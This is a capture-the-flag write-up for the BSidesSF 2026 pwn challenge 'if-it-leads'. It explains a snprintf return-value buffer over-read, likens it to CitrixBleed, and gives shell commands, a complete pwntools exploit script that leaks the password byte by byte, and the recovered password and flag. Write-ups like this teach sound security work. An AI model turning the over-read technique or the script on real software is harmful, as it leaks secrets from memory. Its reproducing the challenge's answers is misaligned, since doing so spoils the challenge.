# if-it-leads

| Campo       | Valor              |
|-------------|--------------------|
| Plataforma  | BSidesSF 2026      |
| Categoría   | Pwn                |
| Dificultad  | Easy-Medium        |
| Puntos      | (dynamic)          |
| Autor       | ron                |

## Descripción
> Can you figure out the secret password to print the flag?
>
> Flag Path: /home/ctf/flag.txt

## TL;DR
Buffer over-read via `snprintf` return value inflation. The `%04d` format for the year field returns more characters than it writes when given a large number, inflating the `offset` variable. `fwrite(idv3, 1, offset, ...)` then reads past the `idv3[128]` buffer into adjacent stack memory containing the password. Analogous to **CitrixBleed (CVE-2023-4966)**.

## Análisis inicial

```bash
ls -la
# -r-------- 1 target target    40 flag.txt
# -r-sr-sr-x 1 target target 17048 if-it-leads   ← SUID binary
# -rw-r--r-- 1 ctf    ctf     3530 if-it-leads.c  ← source provided
# -r-------- 1 target target     8 password.txt   ← 7 chars + newline

cat password.txt
# Permission denied — only readable by target user (SUID binary)
```

Source code provided (`if-it-leads.c`). The binary is SUID — it runs as `target` who owns both `flag.txt` and `password.txt`.

## Vulnerabilidad identificada

### Program flow

1. Reads password from `password.txt` into `password[32]`
2. Prompts user for password — if correct, prints flag
3. If wrong, enters "ID3 Tag Generator" mode
4. Builds an ID3v1 tag in `idv3[128]` using `snprintf` at tracked `offset`
5. Writes `fwrite(idv3, 1, offset, file)` to chosen output (stdout with `-`)

### The bug: snprintf return value vs bytes written

```c
// Line 89 — Year field
offset += snprintf(idv3 + offset, 5, "%04d", year);
```

`snprintf(buf, size, fmt, ...)` returns the number of characters that **would have been written** (excluding null), **not** the number actually written. When `year` has more than 4 digits:

| Year | snprintf writes | snprintf returns | Offset inflation |
|------|----------------|-----------------|-----------------|
| 2025 | `"2025\0"` (5B) | 4 | 0 |
| 99999 | `"9999\0"` (5B) | 5 | +1 |
| 999999999 | `"9999\0"` (5B) | 9 | +5 |
| -2147483648 | `"-214\0"` (5B) | 11 | +7 |

With `year = -2147483648`, offset gets inflated by 7. Normal final offset is 128; inflated offset becomes **135**.

### The over-read

```c
fwrite(idv3, 1, offset, append);  // offset = 135, reads 7 bytes past idv3[128]
```

On the stack, `password[32]` sits immediately above `idv3[128]`. The extra 7 bytes read from `password[0..6]` — leaking the password through stdout.

### Complication: comment field overwrites password

The comment `snprintf` (line 96) starts at the inflated offset, writing **into** the password region:

```c
offset += snprintf(idv3 + offset, 30, "%-29s", input);  // writes 29 spaces + \0
```

With inflation N, the comment overwrites `password[0..N-2]` with spaces/nulls, but `password[N-1]` remains intact. The **last byte** of `fwrite` output = one uncorrupted password character.

### CWE
CWE-126: Buffer Over-read — analogous to CitrixBleed (CVE-2023-4966) where a length/offset mismatch causes reading sensitive data from adjacent memory.

## Proceso de resolución

### Paso 1: Identify the vulnerability

Reading the source, the hint comment was key:

```c
/* Prevent timing attacks or bruteforcing (ACTUALLY! There's a better way to
 * solve this!!) */
```

The `snprintf` return value inflation → `fwrite` over-read pattern was identified by tracing the `offset` variable through each field.

### Paso 2: Local verification

```bash
gcc -o if-it-leads if-it-leads.c
echo "not-the-real-password" > password.txt
echo "flag{test}" > flag.txt
```

```python
# Test with different year values
printf "wrong\nA\nB\nC\n-2147483648\nD\n-\n" | ./if-it-leads 2>/dev/null | xxd | tail -3
# Shows 135 bytes output (7 past the 128-byte buffer)
# Last byte = password[6]
```

Confirmed: each year inflation level leaks one password character as the last byte of output.

### Paso 3: Remote enumeration

```bash
ls -la password.txt
# -r-------- 1 target target 8 password.txt
```

8 bytes = 7 character password + newline. Exactly within the 7-byte leak range.

### Paso 4: Leak password byte by byte

For each inflation level 1-7, run the binary with the corresponding year value and extract the last output byte:

```bash
# Inflation 1 → password[0]
printf "wrong\nA\nB\nC\n99999\nD\n-\n" | ./if-it-leads 2>/dev/null | xxd | tail -1
# ...44                                       D

# Inflation 2 → password[1]
printf "wrong\nA\nB\nC\n999999\nD\n-\n" | ./if-it-leads 2>/dev/null | xxd | tail -1
# ...0052                                     .R

# ... and so on for each inflation level
```

Results:

| Inflation | Year | Last byte | Char |
|-----------|------|-----------|------|
| 1 | 99999 | 0x44 | D |
| 2 | 999999 | 0x52 | R |
| 3 | 9999999 | 0x4D | M |
| 4 | 99999999 | 0x2D | - |
| 5 | 999999999 | 0x70 | p |
| 6 | 2147483647 | 0x77 | w |
| 7 | -2147483648 | 0x21 | ! |

**Password: `DRM-pw!`**

### Paso 5: Get the flag

```bash
echo "DRM-pw!" | ./if-it-leads
# Loading.......
# For SUPER SECRET ACCESS to the DRM'd media, please enter the SUPER SECRET PASSWORD!! ->
# Well done! Here's your super secret media:
#
# CTF{that-was-citrixbleed-cve-2023-4966}
```

## Exploit final

```python
#!/usr/bin/env python3
"""
Challenge: if-it-leads
Category:  pwn
Platform:  BSidesSF 2026
Vuln:      snprintf return value inflation → fwrite buffer over-read (CitrixBleed analog)
"""
from pwn import *
import time

HOST = "if-it-leads-39d83b0e.challenges.bsidessf.net"
PORT = 4445

# Year values producing N+4 digit output from %04d → inflation of N
YEAR_FOR_INFLATION = {
    1: 99999,         # 5 digits
    2: 999999,        # 6 digits
    3: 9999999,       # 7 digits
    4: 99999999,      # 8 digits
    5: 999999999,     # 9 digits
    6: 2147483647,    # 10 digits
    7: -2147483648,   # 11 chars (with minus)
}

def leak_password_byte(inflation):
    """Leak password[inflation-1] using snprintf return value inflation."""
    year = YEAR_FOR_INFLATION[inflation]
    p = remote(HOST, PORT, timeout=15)
    p.recvuntil(b'$ ', timeout=15)

    cmd = f'printf "wrong\\nA\\nB\\nC\\n{year}\\nD\\n-\\n" | ./if-it-leads 2>/dev/null | xxd | tail -1'
    p.sendline(cmd.encode())
    data = p.recvuntil(b'$ ', timeout=15)
    p.close()

    # Parse last hex byte from xxd output
    for line in data.decode('latin-1').split('\n'):
        if line.strip().startswith('0000'):
            # Last 2 hex chars before ASCII column
            hex_part = line.split(':')[1] if ':' in line else ''
            hex_bytes = hex_part.replace(' ', '')
            if hex_bytes:
                return bytes.fromhex(hex_bytes[-2:])
    return None

def get_flag(password):
    """Submit password and get flag."""
    p = remote(HOST, PORT, timeout=15)
    p.recvuntil(b'$ ', timeout=15)
    p.sendline(f'echo "{password}" | ./if-it-leads'.encode())
    data = p.recvuntil(b'$ ', timeout=15)
    p.close()
    return data.decode('latin-1', errors='replace')

# Phase 1: Leak password
print("[*] Leaking password byte by byte...")
password_chars = []
for i in range(1, 8):
    b = leak_password_byte(i)
    if b:
        c = b.decode('latin-1')
        password_chars.append(c)
        print(f"  password[{i-1}] = {b.hex()} = {c!r}")
    time.sleep(1)

password = ''.join(password_chars)
print(f"\n[+] Password: {password}")

# Phase 2: Get flag
print("[*] Submitting password...")
result = get_flag(password)
print(result)
```

## Ejecución
```bash
python3 solve.py
# [*] Leaking password byte by byte...
#   password[0] = 44 = 'D'
#   password[1] = 52 = 'R'
#   password[2] = 4d = 'M'
#   password[3] = 2d = '-'
#   password[4] = 70 = 'p'
#   password[5] = 77 = 'w'
#   password[6] = 21 = '!'
#
# [+] Password: DRM-pw!
# [*] Submitting password...
# Well done! Here's your super secret media:
# CTF{that-was-citrixbleed-cve-2023-4966}
```

## Flag
```
CTF{that-was-citrixbleed-cve-2023-4966}
```

## Key Lessons
- **`snprintf` return value ≠ bytes written**: `snprintf` returns the number of characters that *would* be written, not the actual count. Using the return value as a length for subsequent operations (like `fwrite`) creates an over-read when the output is truncated by the buffer size parameter.
- **CitrixBleed pattern**: This is exactly CVE-2023-4966 — a response buffer over-read caused by a length variable exceeding the actual buffer content, leaking adjacent sensitive memory (session tokens in Citrix, password in this challenge).
- **Stack adjacency**: Local variables on the stack are adjacent. A buffer over-read on one variable leaks the contents of neighboring variables.
- **Byte-at-a-time oracle**: Even when subsequent operations partially corrupt the leaked data (comment `snprintf` overwriting password bytes), varying the inflation level creates an oracle that reveals one uncorrupted byte per run.
- **SUID + source code = fast analysis**: Having the source code made identifying the vulnerability straightforward. The comment "There's a better way!" was a strong hint that brute-force wasn't the intended approach.

## Referencias
- [CVE-2023-4966 (CitrixBleed)](https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966)
- [snprintf(3) man page — return value semantics](https://man7.org/linux/man-pages/man3/snprintf.3.html)
- CWE-126: Buffer Over-read
